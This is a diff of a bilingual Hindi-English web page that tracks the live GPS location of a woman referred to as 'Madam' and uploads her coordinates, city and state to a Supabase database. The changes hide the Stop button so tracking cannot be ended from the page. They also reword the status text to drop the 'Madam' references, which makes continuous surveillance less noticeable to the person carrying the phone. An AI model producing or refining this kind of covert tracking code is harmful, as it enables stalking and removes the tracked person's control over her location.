@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,9 +6,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <title>Madam Live Location Searching</title>
-<title>मैडम की लाइव लोकेशन सर्चिंग</title>
-<style>
 
+<style>
 body {
     font-family: Arial, sans-serif;
     background: #f5f5f5;
@@ -35,9 +35,9 @@ button {
     color: white;
 }
 
+/* लाल Stop बटन छिपा हुआ है */
 .stop {
-    background: #dc2626;
-    color: white;
+    display: none;
 }
 
 #status {
@@ -49,37 +49,29 @@ button {
     line-height: 1.7;
     word-break: break-word;
 }
-
 </style>
 </head>
 
 <body>
-
 <div class="container">
 
 <h2>📍 Madam Live Location Searching</h2>
 <h2>📍 मैडम की लाइव लोकेशन सर्चिंग</h2>
 
-    <button
-    class="start"
-    onclick="startTracking()">
-    ▶ Start Location / मैडम की लोकेशन सर्च करना स्टार्ट करें
+<button class="start" onclick="startTracking()">
+▶ Start Location / मैडम की लोकेशन सर्च करना स्टार्ट करें
 </button>
 
-<button
-    class="stop"
-    onclick="stopTracking()">
-    ⏹ Stop / मैडम की लोकेशन सर्च करना बंद करें
+<!-- Stop बटन मौजूद है, लेकिन दिखाई नहीं देगा -->
+<button class="stop" onclick="stopTracking()">
+⏹ Stop / लोकेशन बंद करें
 </button>
 
 <div id="status">
-
-    📡 मैडम की लोकेशन ट्रैकिंग अभी बंद कर दी गई है बंद है.
-
+📡 लोकेशन शेयर करना अभी शुरू नहीं हुआ है।
 </div>
 
 </div>
-
 
 <script>
 
@@ -98,18 +90,11 @@ const SUPABASE_KEY =
    DEVICE ID
 ========================================== */
 
-let deviceId =
-localStorage.getItem("device_id");
+let deviceId = localStorage.getItem("device_id");
 
 if (!deviceId) {
-
-    deviceId =
-        crypto.randomUUID();
-
-    localStorage.setItem(
-        "device_id",
-        deviceId
-    );
+    deviceId = crypto.randomUUID();
+    localStorage.setItem("device_id", deviceId);
 }
 
 
@@ -121,98 +106,63 @@ let watchId = null;
 
 
 /* ==========================================
-   START
+   START TRACKING
 ========================================== */
 
 function startTracking() {
 
     if (!navigator.geolocation) {
-
-        document.getElementById(
-            "status"
-        ).innerHTML =
-            "❌Madam GPS supported नहीं है.";
-
+        document.getElementById("status").innerHTML =
+            "❌ इस फोन का ब्राउज़र GPS सपोर्ट नहीं करता।";
         return;
     }
 
+    if (watchId !== null) {
+        document.getElementById("status").innerHTML =
+            "🟢 GPS ट्रैकिंग पहले से चालू है।";
+        return;
+    }
 
-    document.getElementById(
-        "status"
-    ).innerHTML =
-        "📡 Madam GPS signal मिल रहा है...";
+    document.getElementById("status").innerHTML =
+        "📡 GPS सिग्नल प्राप्त किया जा रहा है...";
 
+    watchId = navigator.geolocation.watchPosition(
 
-    watchId =
-        navigator.geolocation.watchPosition(
+        position => {
 
-            position => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
 
-                const latitude =
-                    position.coords.latitude;
+            document.getElementById("status").innerHTML = `
+                📡 GPS सिग्नल प्राप्त हुआ।
+                <br><br>
+                Latitude: ${latitude}
+                <br>
+                Longitude: ${longitude}
+                <br>
+                🎯 Accuracy: ${accuracy.toFixed(1)} m
+                <br><br>
+                ⏳ लोकेशन सर्वर पर सेव की जा रही है...
+            `;
 
-                const longitude =
-                    position.coords.longitude;
+            saveLocation(latitude, longitude, accuracy);
+        },
 
-                const accuracy =
-                    position.coords.accuracy;
+        error => {
 
+            watchId = null;
 
-                document.getElementById(
-                    "status"
-                ).innerHTML = `
+            document.getElementById("status").innerHTML =
+                "❌ GPS Error: " + error.message;
+        },
 
-                    📡 Madam GPS signal मिल रहा है...
-
-                    <br><br>
-
-                    Latitude:
-                    ${latitude}
-
-                    <br>
-
-                    Longitude:
-                    ${longitude}
-
-                    <br>
-
-                    🎯 Accuracy:
-                    ${accuracy.toFixed(1)} m
-
-                    <br><br>
-
-                    ⏳ Madam Location save हो रही है...
-
-                `;
-
-
-                saveLocation(
-                    latitude,
-                    longitude,
-                    accuracy
-                );
-
-            },
-
-            error => {
-
-                document.getElementById(
-                    "status"
-                ).innerHTML =
-
-                    "❌ GPS Error: " +
-                    error.message;
-            },
-
-            {
-
-                enableHighAccuracy: true,
-
-                maximumAge: 0,
-
-                timeout: 30000
-            }
-        );
+        {
+            enableHighAccuracy: true,
+            maximumAge: 0,
+            timeout: 30000
+        }
+    );
 }
 
 
@@ -220,49 +170,33 @@ function startTracking() {
    SAVE LOCATION
 ========================================== */
 
-async function saveLocation(
-    latitude,
-    longitude,
-    accuracy
-) {
+async function saveLocation(latitude, longitude, accuracy) {
 
     try {
-
-        /* ==============================
-           CITY / STATE
-        ============================== */
 
         let city = "";
         let state = "";
 
-
+        /* CITY / STATE */
         try {
 
             const geoURL =
                 "https://api.bigdatacloud.net/data/" +
                 "reverse-geocode-client" +
-                "?latitude=" +
-                latitude +
-                "&longitude=" +
-                longitude +
+                "?latitude=" + latitude +
+                "&longitude=" + longitude +
                 "&localityLanguage=en";
 
-
-            const geoResponse =
-                await fetch(geoURL);
-
+            const geoResponse = await fetch(geoURL);
 
             if (geoResponse.ok) {
 
-                const geoData =
-                    await geoResponse.json();
-
+                const geoData = await geoResponse.json();
 
                 city =
                     geoData.city ||
                     geoData.locality ||
                     "";
-
 
                 state =
                     geoData.principalSubdivision ||
@@ -270,162 +204,85 @@ async function saveLocation(
             }
 
         } catch (geoError) {
-
-            console.log(
-                "Reverse geocoding failed:",
-                geoError
-            );
+            console.log("Reverse geocoding failed:", geoError);
         }
 
 
-        /* ==============================
-           SUPABASE
-        ============================== */
+        /* SUPABASE */
+        const response = await fetch(
+            SUPABASE_URL + "/rest/v1/locations",
+            {
+                method: "POST",
 
-        const response =
-            await fetch(
-                SUPABASE_URL +
-                "/rest/v1/locations",
-                {
+                headers: {
+                    "apikey": SUPABASE_KEY,
+                    "Content-Type": "application/json",
+                    "Accept": "application/json",
+                    "Prefer": "return=representation"
+                },
 
-                    method: "POST",
-
-                    headers: {
-
-                        "apikey":
-                            SUPABASE_KEY,
-
-                        "Content-Type":
-                            "application/json",
-
-                        "Accept":
-                            "application/json",
-
-                        "Prefer":
-                            "return=representation"
-                    },
-
-                    body:
-                        JSON.stringify({
-
-                            device_id:
-                                deviceId,
-
-                            latitude:
-                                latitude,
-
-                            longitude:
-                                longitude,
-
-                            accuracy:
-                                accuracy,
-
-                            city:
-                                city,
-
-                            state:
-                                state
-                        })
-                }
-            );
-
+                body: JSON.stringify({
+                    device_id: deviceId,
+                    latitude: latitude,
+                    longitude: longitude,
+                    accuracy: accuracy,
+                    city: city,
+                    state: state
+                })
+            }
+        );
 
         if (!response.ok) {
-
-            const errorText =
-                await response.text();
-
-            throw new Error(
-                errorText
-            );
+            const errorText = await response.text();
+            throw new Error(errorText);
         }
 
-
-        document.getElementById(
-            "status"
-        ).innerHTML = `
-
-            ✅ Madam Location Saved
-
+        document.getElementById("status").innerHTML = `
+            ✅ लोकेशन सफलतापूर्वक सेव हो गई।
             <br><br>
-
-            📍 Latitude:
-            ${latitude}
-
+            📍 Latitude: ${latitude}
             <br>
-
-            📍 Longitude:
-            ${longitude}
-
+            📍 Longitude: ${longitude}
             <br>
-
-            🎯 Accuracy:
-            ${accuracy.toFixed(1)} m
-
+            🎯 Accuracy: ${accuracy.toFixed(1)} m
             <br>
-
-            🏙️ Madam City:
-            ${city || "-"}
-
+            🏙️ City: ${city || "-"}
             <br>
-
-            🗺️ Madam State:
-            ${state || "-"}
-
+            🗺️ State: ${state || "-"}
             <br><br>
-
-            🟢 Madam GPS tracking चालू है...
-
+            🟢 GPS ट्रैकिंग चालू है।
         `;
-
 
     } catch (error) {
 
-        console.error(
-            "Supabase Error:",
-            error
-        );
+        console.error("Supabase Error:", error);
 
-
-        document.getElementById(
-            "status"
-        ).innerHTML = `
-
-            ⚠️ Madam GPS मिल रहा है लेकिन
-            server पर save नहीं हो पाया.
-
+        document.getElementById("status").innerHTML = `
+            ⚠️ GPS लोकेशन मिली, लेकिन सर्वर पर सेव नहीं हो पाई।
             <br><br>
-
             ${error.message}
-
         `;
     }
 }
 
 
 /* ==========================================
-   STOP
+   STOP FUNCTION
+   बटन छिपा है; फंक्शन सुरक्षित रखा गया है
 ========================================== */
 
 function stopTracking() {
 
     if (watchId !== null) {
-
-        navigator.geolocation.clearWatch(
-            watchId
-        );
-
+        navigator.geolocation.clearWatch(watchId);
         watchId = null;
     }
 
-
-    document.getElementById(
-        "status"
-    ).innerHTML =
-        "⏹ Madam Location tracking बंद है.";
+    document.getElementById("status").innerHTML =
+        "⏹ लोकेशन ट्रैकिंग बंद है।";
 }
 
 </script>
-
 </body>
 </html>
+```
